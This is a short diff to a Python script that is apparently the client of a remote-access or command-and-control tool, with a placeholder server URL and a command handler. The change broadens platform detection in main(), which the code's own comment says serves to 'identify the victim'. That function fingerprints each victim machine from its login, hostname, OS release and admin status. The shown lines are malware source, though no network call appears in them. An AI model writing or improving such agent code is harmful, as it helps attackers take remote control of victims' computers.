@@ -13,7 +13,11 @@ import ctypes
 import psutil
 import socket
 import hashlib
-from kivy.utils import platform as PLATFORM_NAME
+
+try:
+	from kivy.utils import platform as PLATFORM_NAME
+except:
+	PLATFORM_NAME = platform.system()
 
 server_url = "##SERVER_URL##"
 
@@ -120,10 +124,10 @@ def handle_commands(response, identifier):
 def main():
 	global PLATFORM_NAME
 	## Will identify the victim
-	if PLATFORM_NAME == 'win':
+	if PLATFORM_NAME in ['win','Windows']:
 		PLATFORM_NAME = 'Windows'
 		hash = hashlib.sha256((f"{os.getlogin()}@{socket.gethostname()}@{PLATFORM_NAME}@{platform.release()}@{ctypes.windll.shell32.IsUserAnAdmin()}").encode())
-	elif PLATFORM_NAME == 'linux':
+	elif PLATFORM_NAME in ['linux','Linux']:
 		PLATFORM_NAME = 'Linux'
 		hash = hashlib.sha256((f"{os.getlogin()}@{socket.gethostname()}@{PLATFORM_NAME}@{platform.release()}@{os.getuid()}").encode())
 	elif PLATFORM_NAME == 'android':
